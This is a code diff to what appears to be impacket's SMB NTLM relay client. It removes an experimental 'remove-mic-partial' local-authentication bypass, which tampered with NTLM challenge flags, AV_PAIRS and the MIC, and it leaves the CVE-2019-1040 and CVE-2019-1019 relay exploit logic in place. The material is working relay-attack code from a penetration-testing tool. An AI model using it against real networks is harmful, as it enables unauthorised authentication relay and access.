@@ -41,7 +41,7 @@ from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCAR
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
     SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
 from impacket.smbconnection import SMBConnection, SMB_DIALECT
-from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_SEAL
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5 import scmr
@@ -57,9 +57,8 @@ class MYSMB(SMB):
         return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)
 
 class MYSMB3(SMB3):
-    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None, serverConfig=None):
+    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None):
         self.extendedSecurity = extendedSecurity
-        self.serverConfig = serverConfig
         SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)
 
     def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
@@ -67,10 +66,8 @@ class MYSMB3(SMB3):
         self._Connection['ClientSecurityMode'] = 0
 
         if self.RequireMessageSigning is True:
-            # Allow connection if using --remove-mic or --remove-mic-partial exploits
-            if self.serverConfig is None or (not self.serverConfig.remove_mic and not self.serverConfig.remove_mic_partial):
-                LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
-                return
+            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
+            return
 
         self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
         currentDialect = SMB2_DIALECT_WILDCARD
@@ -110,10 +107,8 @@ class MYSMB3(SMB3):
         self._Connection['GSSNegotiateToken'] = negResp['Buffer']
         self._Connection['Dialect']           = negResp['DialectRevision']
         if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
-            # Allow connection if using --remove-mic or --remove-mic-partial exploits
-            if self.serverConfig is None or (not self.serverConfig.remove_mic and not self.serverConfig.remove_mic_partial):
-                LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
-                return
+            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
+            return
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
             self._Connection['SupportsFileLeasing'] = True
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
@@ -297,7 +292,7 @@ class SMBRelayClient(ProtocolClient):
             if self.serverConfig.remove_target:
                 preferredDialect = SMB2_DIALECT_21
             smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
-                               negPacket=packet, preferredDialect=preferredDialect, serverConfig=self.serverConfig)
+                               negPacket=packet, preferredDialect=preferredDialect)
         else:
             # Answer is SMB packet, sticking to SMBv1
             smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
@@ -312,163 +307,34 @@ class SMBRelayClient(ProtocolClient):
         self._uid = uid
 
     def sendNegotiate(self, negotiateMessage):
-        LOG.debug('[SMB] sendNegotiate: Starting NTLM negotiation')
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(negotiateMessage)
-
-        original_flags = negoMessage['flags']
-        LOG.debug('[SMB] sendNegotiate: Original NTLM flags: 0x%x' % original_flags)
-
-        # When exploiting CVE-2019-1040 or NTLM local auth bypass, remove signing flags
+        # When exploiting CVE-2019-1040, remove flags
         if self.serverConfig.remove_mic:
-            LOG.debug('[SMB] sendNegotiate: Using --remove-mic mode (CVE-2019-1040)')
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
-                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
-            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
-                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
-        elif self.serverConfig.remove_mic_partial:
-            LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
-            # Only remove SIGN/SEAL/KEY_EXCH flags - don't add legacy flags
-            # Remove strong auth/signing flags
-            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
-                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
-            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
-                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
-                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
 
-        LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
 
         challenge = NTLMAuthChallenge()
         if self.session.getDialect() == SMB_DIALECT:
-            LOG.debug('[SMB] sendNegotiate: Using SMBv1 dialect')
             challenge.fromString(self.sendNegotiatev1(negotiateMessage))
         else:
-            LOG.debug('[SMB] sendNegotiate: Using SMBv2/v3 dialect')
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
 
         self.negotiateMessage = negotiateMessage
-
-        # CRITICAL: Handle LOCAL_CALL flag for local NTLM authentication
-        if self.serverConfig.remove_mic_partial:
-            NTLMSSP_NEGOTIATE_LOCAL_CALL = 0x00004000
-
-            # Check if server already set LOCAL_CALL flag
-            if challenge['flags'] & NTLMSSP_NEGOTIATE_LOCAL_CALL:
-                LOG.debug('[SMB] sendNegotiate: Server already set LOCAL_CALL flag (0x4000)!')
-                LOG.debug('[SMB] sendNegotiate: Original Reserved field: %r' % challenge['reserved'])
-            else:
-                # Server didn't set it, inject it ourselves
-                challenge['flags'] |= NTLMSSP_NEGOTIATE_LOCAL_CALL
-                LOG.debug('[SMB] sendNegotiate: INJECTED LOCAL_CALL flag (0x4000) into challenge!')
-
-            # The Reserved field should contain a context ID
-            # If server already set one, don't override it
-            if not challenge['reserved'] or challenge['reserved'] == b'\x00' * 8:
-                challenge['reserved'] = b'\x01\x00\x00\x00\x00\x00\x00\x00'  # Fake context ID
-                LOG.debug('[SMB] sendNegotiate: Set fake context ID in Reserved field')
-            else:
-                LOG.debug('[SMB] sendNegotiate: Server provided context ID: %r' % challenge['reserved'])
-
-        try:
-            self.challengeMessage = challenge.getData()
-        except Exception as e:
-            LOG.error('[SMB] sendNegotiate: Error getting challenge data: %s' % str(e))
-            import traceback
-            traceback.print_exc()
-            raise
+        self.challengeMessage = challenge.getData()
 
         # Store the Challenge in our session data dict. It will be used by the SMB Proxy
         self.sessionData['CHALLENGE_MESSAGE'] = challenge
         self.serverChallenge = challenge['challenge']
 
-        # Log challenge details and AV_PAIRS for analysis
-        LOG.debug('[SMB] sendNegotiate: Challenge flags: 0x%x' % challenge['flags'])
-        if challenge['TargetInfoFields']:
-            try:
-                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_EOL, NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_DOMAINNAME, \
-                    NTLMSSP_AV_DNS_HOSTNAME, NTLMSSP_AV_DNS_DOMAINNAME, NTLMSSP_AV_FLAGS, NTLMSSP_AV_TIME, \
-                    NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_CHANNEL_BINDINGS
-                av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
-                LOG.debug('[SMB] sendNegotiate: Challenge contains AV_PAIRS:')
-                av_names = {
-                    NTLMSSP_AV_HOSTNAME: 'HOSTNAME',
-                    NTLMSSP_AV_DOMAINNAME: 'DOMAINNAME',
-                    NTLMSSP_AV_DNS_HOSTNAME: 'DNS_HOSTNAME',
-                    NTLMSSP_AV_DNS_DOMAINNAME: 'DNS_DOMAINNAME',
-                    NTLMSSP_AV_FLAGS: 'FLAGS',
-                    NTLMSSP_AV_TIME: 'TIMESTAMP',
-                    NTLMSSP_AV_TARGET_NAME: 'TARGET_NAME',
-                    NTLMSSP_AV_CHANNEL_BINDINGS: 'CHANNEL_BINDINGS',
-                }
-                for key in av_pairs.fields:
-                    name = av_names.get(key, 'UNKNOWN_0x%02x' % key)
-                    value = av_pairs[key]
-                    if key == NTLMSSP_AV_FLAGS and value:
-                        # Decode flags value
-                        flags_val = int.from_bytes(value[1], byteorder='little') if len(value) > 1 else 0
-                        LOG.debug('[SMB] sendNegotiate:   %s = 0x%08x' % (name, flags_val))
-                    elif key in [NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_DOMAINNAME, NTLMSSP_AV_DNS_HOSTNAME,
-                                 NTLMSSP_AV_DNS_DOMAINNAME, NTLMSSP_AV_TARGET_NAME]:
-                        try:
-                            text = value[1].decode('utf-16le') if len(value) > 1 else ''
-                            LOG.debug('[SMB] sendNegotiate:   %s = "%s"' % (name, text))
-                        except:
-                            LOG.debug('[SMB] sendNegotiate:   %s = %r' % (name, value))
-                    else:
-                        LOG.debug('[SMB] sendNegotiate:   %s = %r' % (name, value))
-            except Exception as e:
-                LOG.debug('[SMB] sendNegotiate: Could not parse challenge AV_PAIRS: %s' % str(e))
-
-        # For --remove-mic-partial mode, modify challenge AV_PAIRS to signal local authentication
-        if self.serverConfig.remove_mic_partial and challenge['TargetInfoFields']:
-            try:
-                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_FLAGS, NTLMSSP_AV_HOSTNAME
-                av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
-
-                # Extract the actual hostname from challenge AV_PAIRS
-                hostname = 'localhost'  # fallback
-                if NTLMSSP_AV_HOSTNAME in av_pairs.fields:
-                    try:
-                        hostname_bytes = av_pairs[NTLMSSP_AV_HOSTNAME][1]
-                        hostname = hostname_bytes.decode('utf-16le')
-                        LOG.debug('[SMB] sendNegotiate: Extracted hostname from challenge: "%s"' % hostname)
-                    except:
-                        pass
-
-                # Set TARGET_NAME as "cifs/<hostname>" to signal local authentication
-                # Use the actual hostname from the challenge instead of "localhost"
-                # Note: AV_PAIRS.__setitem__ automatically wraps value with (len, value)
-                target_name_str = f'cifs/{hostname}'
-                target_name = target_name_str.encode('utf-16le')
-                av_pairs[NTLMSSP_AV_TARGET_NAME] = target_name
-                LOG.debug('[SMB] sendNegotiate: Modified challenge - added TARGET_NAME = "%s"' % target_name_str)
-
-                # Add AV_FLAGS with MIC present flag (0x00000002)
-                # This signals that MIC is expected in the response
-                av_flags_value = (0x00000002).to_bytes(4, byteorder='little')
-                av_pairs[NTLMSSP_AV_FLAGS] = av_flags_value
-                LOG.debug('[SMB] sendNegotiate: Modified challenge - added AV_FLAGS = 0x00000002 (MIC present)')
-
-                # Update the challenge with modified AV_PAIRS
-                challenge['TargetInfoFields'] = av_pairs.getData()
-                self.challengeMessage = challenge.getData()
-                LOG.debug('[SMB] sendNegotiate: Challenge AV_PAIRS modified for local auth simulation')
-            except Exception as e:
-                LOG.error('[SMB] sendNegotiate: Failed to modify challenge AV_PAIRS: %s' % str(e))
-                import traceback
-                traceback.print_exc()
-
-        LOG.debug('[SMB] sendNegotiate: Received challenge from server, returning to relay')
         return challenge
 
     def sendNegotiatev2(self, negotiateMessage):
@@ -606,16 +472,9 @@ class SMBRelayClient(ProtocolClient):
         return clientResponse, errorCode
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
-        LOG.debug('[SMB] sendAuth: Starting authentication with server')
 
-        # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
+        # When exploiting CVE-2019-1040, remove flags
         if self.serverConfig.remove_mic:
-            LOG.debug('[SMB] sendAuth: Applying --remove-mic transformations')
-            # Check if SPNEGO-wrapped and unwrap if needed
-            if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
-                respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
-                authenticateMessageBlob = respToken2['ResponseToken']
-
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(authenticateMessageBlob)
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
@@ -631,94 +490,6 @@ class SMBRelayClient(ProtocolClient):
             authMessage['Version'] = b''
             authMessage['VersionLen'] = 0
             authenticateMessageBlob = authMessage.getData()
-        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
-        elif self.serverConfig.remove_mic_partial:
-            LOG.debug('[SMB] sendAuth: Applying --remove-mic-partial transformations')
-            LOG.debug('[SMB] sendAuth: authenticateMessageBlob length: %d, first byte: 0x%x' % (len(authenticateMessageBlob), authenticateMessageBlob[0]))
-
-            # Check if SPNEGO-wrapped and unwrap if needed
-            if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
-                LOG.debug('[SMB] sendAuth: Unwrapping SPNEGO')
-                respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
-                authenticateMessageBlob = respToken2['ResponseToken']
-                LOG.debug('[SMB] sendAuth: SPNEGO unwrapped, new length: %d' % len(authenticateMessageBlob))
-
-            authMessage = NTLMAuthChallengeResponse()
-            LOG.debug('[SMB] sendAuth: Created NTLMAuthChallengeResponse object, about to parse')
-            authMessage.fromString(authenticateMessageBlob)
-            LOG.debug('[SMB] sendAuth: Successfully parsed NTLM message')
-
-            # Log the username and domain being authenticated
-            try:
-                username = authMessage['user_name'].decode('utf-16le') if authMessage['user_name'] else ''
-                domain = authMessage['domain_name'].decode('utf-16le') if authMessage['domain_name'] else ''
-                LOG.debug('[SMB] sendAuth: Authenticating as user: "%s", domain: "%s"' % (username, domain))
-            except:
-                LOG.debug('[SMB] sendAuth: Could not decode username/domain')
-
-            original_flags = authMessage['flags']
-            LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
-
-            # Only remove SIGN/SEAL/KEY_EXCH/VERSION flags - don't add legacy flags
-            # Remove strong auth/signing flags
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
-                authMessage['Version'] = b''
-                authMessage['VersionLen'] = 0
-
-            # Strip MIC field (zero it out)
-            authMessage['MIC'] = b'\x00' * 16
-            LOG.debug('[SMB] sendAuth: Stripped MIC field (zeroed out)')
-
-            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x' % authMessage['flags'])
-
-            # Try to extract/derive session key for SMB operations
-            # Log what we have to work with
-            LOG.debug('[SMB] sendAuth: NTLMv2 response length: %d' % (len(authMessage['ntlm']) if authMessage['ntlm'] else 0))
-            LOG.debug('[SMB] sendAuth: LM response length: %d' % (len(authMessage['lanman']) if authMessage['lanman'] else 0))
-            LOG.debug('[SMB] sendAuth: Encrypted session key length: %d' % (len(authMessage['session_key']) if authMessage['session_key'] else 0))
-
-            # Log AV_PAIRS if present in NTLMv2 response
-            # NTLMv2 response format: HMAC(16 bytes) + blob (variable)
-            # Blob format: signature(4) + reserved(4) + timestamp(8) + challenge(8) + reserved(4) + av_pairs + reserved(4)
-            if authMessage['ntlm'] and len(authMessage['ntlm']) > 32:
-                try:
-                    from impacket.ntlm import AV_PAIRS
-                    # Skip HMAC (16 bytes) + signature (4) + reserved (4) + timestamp (8) + challenge (8) + reserved (4) = 44 bytes
-                    av_pairs_data = authMessage['ntlm'][44:]
-                    # Find the end of AV_PAIRS (marked by type 0x0000)
-                    av_pairs = AV_PAIRS(av_pairs_data)
-                    LOG.debug('[SMB] sendAuth: AV_PAIRS found in NTLMv2 response:')
-                    for key in av_pairs.fields:
-                        LOG.debug('[SMB] sendAuth:   AV_PAIR type 0x%02x: %r' % (key, av_pairs[key]))
-                except Exception as e:
-                    LOG.debug('[SMB] sendAuth: Could not parse AV_PAIRS: %s' % str(e))
-            else:
-                LOG.debug('[SMB] sendAuth: NTLMv2 response too short or missing, no AV_PAIRS to parse')
-
-            # For local SYSTEM auth, try using the encrypted session key directly if available
-            # Otherwise we may need to derive it differently or accept we can't sign
-            if authMessage['session_key'] and len(authMessage['session_key']) > 0:
-                signingKey = authMessage['session_key']
-                LOG.debug('[SMB] sendAuth: Using encrypted session key from NTLM message, length: %d' % len(signingKey))
-            elif authMessage['ntlm'] and len(authMessage['ntlm']) >= 16:
-                # Try using the first 16 bytes of the NTLMv2 response as session key
-                # This is a heuristic for local auth scenarios
-                signingKey = authMessage['ntlm'][:16]
-                LOG.debug('[SMB] sendAuth: Attempting to use NTLMv2 response as session key, length: %d' % len(signingKey))
-            else:
-                LOG.debug('[SMB] sendAuth: No usable session key material found')
-                signingKey = None
-
-            authenticateMessageBlob = authMessage.getData()
 
         #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
         #    # We need to unwrap SPNEGO and get the NTLMSSP
@@ -726,12 +497,9 @@ class SMBRelayClient(ProtocolClient):
         #    authData = respToken['ResponseToken']
         #else:
         authData = authenticateMessageBlob
-        LOG.debug('[SMB] sendAuth: authData prepared, length: %d' % len(authData))
 
-        if not signingKey:
-            signingKey = None
+        signingKey = None
         if self.serverConfig.remove_target:
-            LOG.debug('[SMB] sendAuth: Using --remove-target, calculating signing key')
             # Trying to exploit CVE-2019-1019
             # Discovery and Implementation by @simakov_marina and @YaronZi
             # respToken2 = SPNEGO_NegTokenResp(authData)
@@ -752,23 +520,13 @@ class SMBRelayClient(ProtocolClient):
             #authData = respToken2.getData()
 
         if self.session.getDialect() == SMB_DIALECT:
-            LOG.debug('[SMB] sendAuth: Sending SMBv1 authentication')
             token, errorCode = self.sendAuthv1(authData, serverChallenge)
         else:
-            LOG.debug('[SMB] sendAuth: Sending SMBv2/v3 authentication')
             token, errorCode = self.sendAuthv2(authData, serverChallenge)
-
-        LOG.debug('[SMB] sendAuth: Authentication completed with error code: 0x%x' % errorCode)
 
         if signingKey:
             logging.info("Enabling session signing")
             self.session._SMBConnection.set_session_key(signingKey)
-        else:
-            LOG.debug('[SMB] sendAuth: No signing key available, session will operate without signing')
-            # For --remove-mic-partial, use empty session key (no signing)
-            if self.serverConfig.remove_mic_partial:
-                LOG.debug('[SMB] sendAuth: Setting empty session key for --remove-mic-partial mode')
-                self.session._SMBConnection.set_session_key(b'')
 
         return token, errorCode
 
